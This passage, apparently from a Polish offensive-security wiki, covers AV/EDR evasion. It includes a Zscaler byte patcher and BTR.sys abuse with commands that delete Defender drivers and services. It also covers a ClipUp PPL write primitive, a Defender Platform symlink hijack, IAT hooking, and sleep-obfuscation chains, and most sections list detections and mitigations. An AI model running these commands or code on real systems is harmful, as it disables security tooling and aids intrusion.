| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione instrukcjami NOP ⇒ dowolny proces (nawet niepodpisany) może połączyć się z potokami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Fragment minimalnego patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wyświetlają status **zielony/zgodny**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać punkty końcowe RPC nazwanych potoków (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zaatakowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej określonej przez zasady Zscaler.

To studium przypadku pokazuje, jak kilka poprawek bajtów może obejść decyzje o zaufaniu podejmowane wyłącznie po stronie klienta oraz proste kontrole podpisu.

## Nadużycie zaufanej funkcjonalności Microsoft Defender `BTR.sys`

Sterownik **Boot-Time Removal** w Defenderze stanowi użyteczny kontrprzykład dla klasycznego BYOVD. `BTR.sys` to legalny, podpisany przez Microsoft komponent naprawczy, który nie zawiera błędu powodującego uszkodzenie pamięci ani interfejsu IOCTL; po uzyskaniu dostępu administratora i uprawnienia `SeLoadDriverPrivilege` operator może zamiast tego sfałszować prywatną transakcję naprawczą i uzyskać dostęp do operacji na plikach/rejestrze w Ring-0, zgodnych z przeznaczeniem sterownika. Jest to **prymityw neutralizacji AV/EDR po przejęciu systemu, a nie metoda uzyskania początkowego dostępu ani eskalacji uprawnień**. Sterownik można wyodrębnić z zasobu `BOOTTIMETOOL` w pliku `MpEngine.dll` na zaatakowanym hoście, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie jednorazowego sterownika

Defender zwykle zapisuje zasób jako plik o losowej nazwie `[a-z]{8}.sys` i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany NTFS ADS, odszyfrowuje i weryfikuje listę działań, zapisuje informacje zwrotne, a po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), aby sterownik został wyładowany, zamiast pozostawać w pamięci. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Strumień `:changelist` zawiera jeden blob zaszyfrowany RC4. Analizowane kompilacje ponownie używają stałego klucza 256-bajtowego, więc szyfrowanie nie stanowi granicy autoryzacji. Poprawny tekst jawny zawiera 24-bajtowy nagłówek globalny (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka i identyfikator transakcji wyprowadzony z payloadu), po którym następuje zakończona znakiem null ścieżka feedback w UTF-16 oraz dowolna liczba elementów. Każdy element ma 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) oraz dane zależne od akcji, zakończone **dokładnie czterema bajtami NUL**. Każdy obszar nagłówka i danych jest sprawdzany niezależnie za pomocą CRC-32 z wielomianem `0xEDB88320`, stanem początkowym `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest resetowany dla każdego obszaru.<sup>[[36]](#references)[[37]](#references)</sup>

Akceptowane identyfikatory akcji udostępniają następujące prymitywy jądra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Rezultat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Usunięcie pliku, także zablokowanego |
| 2 | `[UTF-16 path]` | Usunięcie pustego katalogu |
| 3 | `[Flags][source][destination]` | Przeniesienie pliku do chronionej ścieżki wybranej przez atakującego; puste miejsce docelowe oznacza usunięcie |
| 4 | `[Flags][key path]` | Rekurencyjne usunięcie klucza rejestru |
| 5 | `[Flags][key path + "\\" + value]` | Usunięcie wartości rejestru |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Utworzenie/zaktualizowanie wartości rejestru i utworzenie brakujących ścieżek kluczy |

W przypadku akcji 5 i 6 separator klucza/wartości w formacie przewodowym to **dwa kolejne ukośniki odwrotne**; konwencjonalnie sformatowana ścieżka nie zostanie poprawnie podzielona. Plik feedback w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu są zastępowane jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają początkowego pola flags, BTR przesuwa ścieżkę do czterech zarezerwowanych bajtów końcowych, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Przepływ pracy `BTR_CLI` i okno wczesnego rozruchu

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) realizuje cały łańcuch działań: wyodrębnia `BTR.sys` z lokalnego Defendera, tworzy `<random>.sys:changelist` i strumień feedback, serializuje/sumuje kontrolnie/szyfruje łańcuch akcji, bezpośrednio tworzy klucz rejestru usługi, a następnie wywołuje `NtLoadDriver` dla `-trigger now` lub pozostawia sterownik jako uruchamiany przy starcie systemu dla `-trigger boot`. Bezpośrednie przygotowanie rejestru omija standardową ścieżkę SCM `CreateServiceW`, więc **nie powoduje** wygenerowania zdarzenia instalacji usługi o identyfikatorze 7045. Artefakty uruchamiane podczas rozruchu można później usunąć za pomocą `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nie jest użyteczne, ponieważ BTR wykonuje operacje wejścia/wyjścia na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i łącze `SystemRoot` będą gotowe. `Start=1` wraz z grupą o wysokim priorytecie `Boot Bus Extender` powoduje uruchomienie w fazie 1: NTFS jest już dostępny, ale wiele sterowników zabezpieczeń uruchamianych przy starcie systemu oraz usług EDR działających w trybie użytkownika nie zostało jeszcze zainicjowanych. Filtry uruchamiane przy starcie, takie jak `WdFilter`, mogą być już załadowane, jednak BTR może usunąć ich pliki binarne lub konfigurację usług przed kolejnym uruchomieniem, a także usunąć pliki wykonywalne usług, zanim uruchomi je SCM. ELAM nie zamyka tej luki, ponieważ BTR działa po ocenie sterowników rozruchowych i ma prawidłowy podpis Microsoft.<sup>[[36]](#references)</sup>

Wiele działań wykonuje się w ramach jednej transakcji. PoC dodaje jako pierwszą Akcję 1 dla zakodowanego na stałe pliku `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten dziennik, a następnie realizuje własne żądanie usunięcia i usuwa go przed wyładowaniem. Ogranicza to ilość dowodów, a zapisanie informacji zwrotnej w `<random>.sys:<random>.dat` pozwala usunąć sterownik i oba strumienie jednocześnie.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje o wysokim znaczeniu

Reguły oparte wyłącznie na podpisie oraz lista blokowanych podatnych sterowników Microsoft nie przeciwdziałają nadużyciom zamierzonej funkcjonalności BTR. Preferuj poniższe korelacje behawioralne, odróżniając przy tym legalne pochodzenie od Defendera od dowolnego programu uruchamiającego.<sup>[[36]](#references)</sup>

- **Sysmon 15:** utworzenie `.sys:changelist` jest nieodłącznym elementem przygotowania BTR. Strumień ADS `.dat` dołączony do tego samego pliku `.sys` jest szczególnie podejrzany, ponieważ Defender zazwyczaj umieszcza informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez zdarzenia System 7045:** koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>` zawierającego `Args=...:changelist` i `Group=Boot Bus Extender` z brakiem odpowiadającego mu zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** koreluj załadowanie znanego sterownika BTR pochodzącego spoza środowiska Defender z późniejszym usunięciem pliku przypisanym do `System`/PID 4, szczególnie jeśli dotyczy ono plików binarnych zabezpieczeń.
- **Sysmon 11 -> 23:** generuj alert w przypadku szybkiego utworzenia i usunięcia `\SystemRoot\Temp\BootClean.log` przez `System`/PID 4.
- Ogranicz i audytuj przyznawanie/włączanie uprawnienia `SeLoadDriverPrivilege`; sam podpis Microsoft nie gwarantuje zaufania, gdy sterownik narzędzia zabezpieczającego jest przygotowywany przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do manipulowania AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) wymusza hierarchię podpisów/poziomów, dzięki czemu tylko procesy o równym lub wyższym poziomie ochrony mogą wzajemnie wprowadzać w sobie zmiany. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić plik binarny obsługujący PPL i kontrolować jego argumenty, możesz przekształcić nieszkodliwą funkcjonalność (np. rejestrowanie zdarzeń) w ograniczony mechanizm zapisu wspierany przez PPL, działający na chronionych katalogach używanych przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że proces działa jako PPL
- Docelowy plik EXE (oraz wszystkie załadowane biblioteki DLL) musi być podpisany certyfikatem z EKU obsługującym PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony, odpowiadającego podpisowi pliku binarnego (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla podpisów antymalware, `PROTECTION_LEVEL_WINDOWS` dla podpisów Windows). Nieprawidłowe poziomy spowodują niepowodzenie podczas tworzenia procesu.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS tutaj:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia uruchamiające
- Pomocnicze narzędzie open source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego pliku EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schemat użycia:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Podpisany plik systemowy `C:\Windows\System32\ClipUp.exe` uruchamia własny proces potomny i przyjmuje parametr wskazujący ścieżkę, pod którą ma zapisać plik dziennika.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie obsługuje ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać zwykle chronione lokalizacje.

Narzędzia do obsługi krótkich ścieżek 8.3
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (w ujęciu abstrakcyjnym)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z flagą `CREATE_PROTECTED_PROCESS`, używając launchera (np. CreateProcessAsPPL).
2) Przekaż ClipUp argument ścieżki pliku dziennika, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli AV ma zwykle otwarty/zablokowany plik docelowy podczas działania (np. MsMpEng.exe), zaplanuj zapis przy rozruchu, zanim uruchomi się AV, instalując usługę autostartu, która niezawodnie uruchamia się wcześniej. Sprawdź kolejność uruchamiania za pomocą Process Monitor (rejestrowanie rozruchu).
4) Po ponownym uruchomieniu zapis z uprawnieniami PPL nastąpi, zanim AV zablokuje swoje pliki binarne, uszkadzając plik docelowy i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki ukryto/skrócono ze względów bezpieczeństwa):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Uwagi i ograniczenia
- Nie można kontrolować zawartości zapisywanej przez ClipUp poza jej lokalizacją; ta prymitywna metoda nadaje się do uszkadzania, a nie do precyzyjnego wstrzykiwania zawartości.
- Do zainstalowania/uruchomienia usługi wymagane są lokalne uprawnienia administratora/SYSTEM oraz możliwość ponownego uruchomienia komputera.
- Kluczowe jest wyczucie czasu: cel nie może być otwarty; wykonanie podczas rozruchu pozwala uniknąć blokad plików.

Wykrywanie
- Uruchomienie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy jego procesem nadrzędnym są niestandardowe programy uruchamiające, w czasie rozruchu.
- Nowe usługi skonfigurowane do automatycznego uruchamiania podejrzanych plików binarnych, które konsekwentnie uruchamiają się przed Defender/AV. Zbadaj tworzenie/modyfikowanie usług przed awariami uruchamiania Defendera.
- Monitorowanie integralności plików binarnych/Platform Defendera; nieoczekiwane tworzenie/modyfikowanie plików przez procesy z flagami chronionego procesu.
- Telemetria ETW/EDR: szukaj procesów uruchamianych z `CREATE_PROTECTED_PROCESS` oraz nietypowego użycia poziomu PPL przez pliki binarne spoza AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i w jakim kontekście procesów nadrzędnych; blokuj uruchamianie ClipUp poza uzasadnionymi kontekstami.
- Higiena usług: ograniczaj tworzenie/modyfikowanie usług uruchamianych automatycznie i monitoruj manipulowanie kolejnością ich uruchamiania.
- Upewnij się, że ochrona przed manipulacją Defendera i zabezpieczenia wczesnego uruchamiania są włączone; analizuj błędy uruchamiania wskazujące na uszkodzenie plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach, na których znajdują się narzędzia zabezpieczające, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

## Modyfikowanie Microsoft Defendera przez przejęcie dowiązania symbolicznego do folderu wersji Platform

Windows Defender wybiera platformę, z której działa, wyliczając podfoldery w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia stamtąd procesy usługi Defendera (odpowiednio aktualizując ścieżki usługi/rejestru). Wybór ten ufa wpisom katalogu, w tym punktom ponownej analizy będącym katalogami (dowiązaniom symbolicznym). Administrator może wykorzystać tę cechę, aby przekierować Defendera do ścieżki z możliwością zapisu przez atakującego i doprowadzić do DLL sideloading lub zakłócenia działania usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Warunki wstępne
- Lokalny administrator (wymagany do tworzenia katalogów/dowiązań symbolicznych w folderze Platform)
- Możliwość ponownego uruchomienia komputera lub wywołania ponownego wyboru platformy Defendera (restart usługi podczas rozruchu)
- Wymagane są tylko wbudowane narzędzia (mklink)

Dlaczego to działa
- Defender blokuje zapisy w swoich folderach, ale przy wyborze platformy ufa wpisom katalogu i wybiera najwyższą leksykograficznie wersję bez sprawdzania, czy ścieżka docelowa prowadzi do chronionej/zaufanej lokalizacji.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz w katalogu Platform dowiązanie symboliczne do katalogu o wyższej wersji, wskazujące na Twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecane ponowne uruchomienie):
```cmd
shutdown /r /t 0
```
4) Sprawdź, czy MsMpEng.exe (WinDefend) uruchamia się ze ścieżki przekierowanej:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinna być widoczna nowa ścieżka procesu w `C:\TMP\AV\` oraz konfiguracja usługi/rejestru wskazująca tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Umieść/zastąp biblioteki DLL ładowane przez Defendera z jego katalogu aplikacji, aby wykonać kod w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, aby przy następnym uruchomieniu skonfigurowana ścieżka nie wskazywała żadnego pliku, a Defender nie mógł się uruchomić:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Pamiętaj, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga uprawnień administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Zespoły red team mogą przenieść runtime evasion z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i przekierowując wybrane API przez kontrolowany przez atakującego, niezależny od pozycji kod (PIC). Pozwala to rozszerzyć evasion poza niewielki zestaw API udostępniany przez wiele kitów (np. CreateProcessA) oraz objąć tymi samymi zabezpieczeniami BOF-y i biblioteki DLL używane w post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście ogólne
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (z przodu lub jako plik towarzyszący). PIC musi być samowystarczalny i niezależny od pozycji.
- Podczas ładowania hostującej biblioteki DLL przejdź przez jej IMAGE_IMPORT_DESCRIPTOR i zmień wpisy IAT dla wybranych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na proste wrappery PIC.
- Każdy wrapper PIC wykonuje evasion przed wywołaniem właściwego API. Typowe techniki evasion obejmują:
  - Maskowanie/odmaskowywanie pamięci wokół wywołania (np. szyfrowanie regionów beaconu, zmiana uprawnień RWX→RX, zmiana nazw/uprawnień stron), a następnie przywrócenie stanu po wywołaniu.
  - Call-stack spoofing: utworzenie wiarygodnego stosu i przejście do docelowego API, tak aby analiza call stacka wskazywała oczekiwane ramki.<sup>[[9]](#references)</sup>
- Dla zapewnienia kompatybilności udostępnij interfejs, za pomocą którego skrypt Aggressor (lub odpowiednik) może rejestrować API do hookowania w Beaconie, BOF-ach i bibliotekach DLL używanych w post-exploitation.

Dlaczego tutaj warto użyć IAT hookingu
- Działa z każdym kodem korzystającym z hookowanego importu, bez modyfikowania kodu narzędzia i bez polegania na Beaconie w zakresie proxy dla konkretnych API.
- Obejmuje biblioteki DLL używane w post-exploitation: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować te same techniki maskowania oraz evasion stosu do ich wywołań API.
- Przywraca niezawodne działanie poleceń post-exploitation uruchamiających procesy w przypadku detekcji opartych na call stacku, przez opakowanie CreateProcessA/W.

Szkic minimalnego IAT hooka (pseudokod x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notatki
- Zastosuj patch po relokacjach/ASLR, a przed pierwszym użyciem importu. Reflective loadery, takie jak TitanLdr/AceLdr, pokazują, jak wykonywać hooking podczas DllMain załadowanego modułu.
- Ogranicz wrappery do minimum i zadbaj o ich zgodność z PIC; prawdziwe API rozwiąż na podstawie oryginalnej wartości IAT przechwyconej przed patchem albo za pomocą LdrGetProcedureAddress.
- Przy PIC stosuj przejścia RW → RX i unikaj stron z jednoczesnymi uprawnieniami do zapisu i wykonywania.

Stub do call-stack spoofing
- Stuby PIC w stylu Draugr budują fałszywy łańcuch wywołań (z adresami powrotu wewnątrz nieszkodliwych modułów), a następnie przechodzą do prawdziwego API.
- Pozwala to ominąć detekcje oczekujące kanonicznych stosów wywołań z Beacon/BOFs prowadzących do wrażliwych API.
- Połącz tę technikę z stack cutting/stack stitching, aby przed prologiem API znaleźć się wewnątrz oczekiwanych ramek.

Integracja operacyjna
- Dodaj reflective loader na początku DLL-i post-ex, aby PIC i hooki inicjalizowały się automatycznie po załadowaniu DLL-a.
- Użyj skryptu Aggressor do rejestrowania docelowych API, aby Beacon i BOFs mogły korzystać z tej samej ścieżki evasion bez zmian w kodzie.

Kwestie detekcji/DFIR
- Integralność IAT: wpisy wskazujące na adresy spoza obrazu (heap/anon); okresowa weryfikacja wskaźników importu.
- Anomalie stosu: adresy powrotu spoza załadowanych obrazów; nagłe przejścia do niebędącego obrazem PIC; niespójne pochodzenie RtlUserThreadStart.
- Telemetria loadera: zapisy do IAT w procesie; wczesna aktywność DllMain modyfikująca import thunki; nieoczekiwane obszary RX tworzone podczas ładowania.
- Omijanie image-load: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania zestawów automation/clr skorelowane ze zdarzeniami maskowania pamięci.

Powiązane elementy i przykłady
- Reflective loadery wykonujące IAT patching podczas ładowania (np. TitanLdr, AceLdr)
- Hooki memory masking (np. simplehook) i PIC wykorzystujące stack cutting (stackcutting)
- Stuby PIC do call-stack spoofing (np. Draugr)


## IAT Hooking w czasie importu + Sleep Obfuscation (Crystal Palace/PICO)

### Hooki IAT w czasie importu za pośrednictwem rezydentnego PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()`, zastępując wskaźnik loadera `GetProcAddress` własnym resolverem, który najpierw sprawdza hooki:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Zbuduj **rezydentny PICO** (trwały obiekt PIC), który przetrwa zwolnienie tymczasowego PIC loadera.
- Udostępnij funkcję `setup_hooks()`, która nadpisuje resolver importów loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy ordinalne i użyj wyszukiwania hooków na podstawie hashy, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie wywołaj prawdziwe `GetProcAddress`.
- Zarejestruj cele hooków podczas linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje prawidłowy, ponieważ znajduje się w rezydentnym PICO.

Daje to **przekierowanie IAT w czasie importu** bez patchowania sekcji kodu załadowanej DLL po jej załadowaniu.

### Wymuszanie importów możliwych do hookowania, gdy cel używa PEB-walking

Hooki w czasie importu zadziałają tylko wtedy, gdy funkcja rzeczywiście znajduje się w IAT celu. Jeśli moduł rozwiązuje API za pomocą PEB-walk + hash (bez wpisu importu), wymuś rzeczywisty import, aby ścieżka `ProcessImports()` loadera mogła go obsłużyć:

- Zastąp rozwiązywanie eksportu na podstawie hasha (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając przechwycenie importu podczas rozwiązywania importów przez reflective loader.

### Obfuscation uśpienia/bezczynności w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste prymitywy oczekiwania/IPC** używane przez implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długiego oczekiwania opakuj wywołanie w łańcuch obfuscation w stylu Ekko, który szyfruje obraz w pamięci podczas bezczynności:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z odpowiednio przygotowanymi ramkami `CONTEXT`.
- Typowy łańcuch (x64): ustaw obraz na `PAGE_READWRITE` → szyfruj RC4 przez `advapi32!SystemFunction032` cały zmapowany obraz → wykonaj blokujące oczekiwanie → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, przechodząc po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy etap.

Szczegół operacyjny: zwracaj „success” dla długich oczekiwań (np. `WAIT_OBJECT_0`), aby wywołujący kontynuował działanie, gdy obraz jest zamaskowany. Ten wzorzec ukrywa moduł przed skanerami w okresach bezczynności i pozwala uniknąć charakterystycznego wzorca „patched `Sleep()`”.

Pomysły na detekcję (na podstawie telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buforach o rozmiarze obrazu.
- `VirtualProtect` obejmujące duży zakres, po którym następuje niestandardowe przywracanie uprawnień poszczególnych sekcji.

### Rejestracja CFG w czasie działania dla gadżetów sleep-obfuscation

W celach z włączonym CFG pierwszy pośredni skok do gadżetu ze środka funkcji, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle spowoduje awarię procesu z `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadżet nie znajduje się w metadanych CFG modułu. Aby łańcuchy w stylu Ekko/Kraken działały w zabezpieczonych procesach:<sup>[[30]](#references)</sup>

- Zarejestruj każdy pośredni cel używany przez łańcuch za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- W przypadku adresów wewnątrz załadowanych obrazów (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **bazy obrazu** i obejmować **cały rozmiar obrazu**.
- W przypadku ręcznie mapowanych obszarów/PIC/stomped regions użyj **bazy alokacji** i jej rozmiaru.
- Oznacz nie tylko gadżet dispatch, ale także eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wywołania systemowe wait/event) oraz wszelkie wykonywalne sekcje kontrolowane przez atakującego, które staną się pośrednimi celami.

Dzięki temu łańcuchy sleep w stylu ROP/JOP przestają „działać tylko w procesach bez CFG” i stają się użytecznym prymitywem w `explorer.exe`, przeglądarkach, `svchost.exe` i innych procesach skompilowanych z `/guard:cf`.

### Stack spoofing zgodny z CET dla uśpionych wątków

Pełna podmiana `CONTEXT` jest łatwa do wykrycia i może powodować problemy w systemach CET Shadow Stack, ponieważ spoofowany `Rip` musi nadal zgadzać się ze sprzętowym shadow stack. Bezpieczniejszy wzorzec sleep-masking wygląda następująco:<sup>[[30]](#references)</sup>

- Wybierz inny wątek w tym samym procesie i odczytaj granice jego stosu `NT_TIB` / TEB (`StackBase`, `StackLimit`) za pomocą `NtQueryInformationThread`.
- Wykonaj kopię zapasową rzeczywistego TEB/TIB bieżącego wątku.
- Przechwyć rzeczywisty kontekst uśpionego wątku za pomocą `GetThreadContext`.
- Skopiuj do spoof context **wyłącznie** rzeczywisty `Rip`, pozostawiając spoofowane `Rsp`/stan stosu bez zmian.
- Podczas uśpienia skopiuj `NT_TIB` spoofowanego wątku do bieżącego TEB, aby stack walkery rozwijały stos w prawidłowym zakresie.
- Po zakończeniu oczekiwania przywróć pierwotny TIB i kontekst wątku.

Zachowuje to wskaźnik instrukcji zgodny z CET, a jednocześnie wprowadza w błąd stack walkery EDR, które polegają na metadanych stosu TEB przy walidacji rozwijania stosu.

### Alternatywa oparta na APC: Kraken Mask

Jeśli dispatch kolejki timerów jest zbyt charakterystyczny, tę samą sekwencję sleep-encrypt-spoof-restore można wykonać z zawieszonego wątku pomocniczego przy użyciu kolejkowanych APC:<sup>[[27]](#references)</sup>

- Utwórz wątek pomocniczy z `NtTestAlert` jako punktem wejścia.
- Zakolejkuj przygotowane ramki `CONTEXT`/APC za pomocą `NtQueueApcThread` i opróżnij kolejkę przez `NtAlertResumeThread`.
- Przechowuj stan łańcucha na heapie, a nie na stosie wątku pomocniczego, aby uniknąć wyczerpania domyślnego stosu wątku o rozmiarze 64 KB.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować zdarzenie startowe i przejść w stan oczekiwania.
- Zawieś główny wątek przed przywróceniem TIB/kontekstu (`NtSuspendThread` → przywrócenie → `NtResumeThread`), aby skrócić okno wyścigu, w którym skaner mógłby wykryć częściowo przywrócony stos.

Zastępuje to charakterystyczny wzorzec `CreateTimerQueueTimer` + `NtContinue` wzorcem wątku pomocniczego/APC, zachowując te same cele RC4 masking i stack spoofing.

Dodatkowe pomysły na detekcję
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` tuż przed uśpieniem, oczekiwaniem lub dispatch APC.
- `GetThreadContext`/`SetThreadContext` wykonywane w ramach wywołań `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do granic stosu TEB/TIB bieżącego wątku.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread` prowadzące pośrednio do `SystemFunction032`, `VirtualProtect` lub funkcji pomocniczych przywracających uprawnienia sekcji.
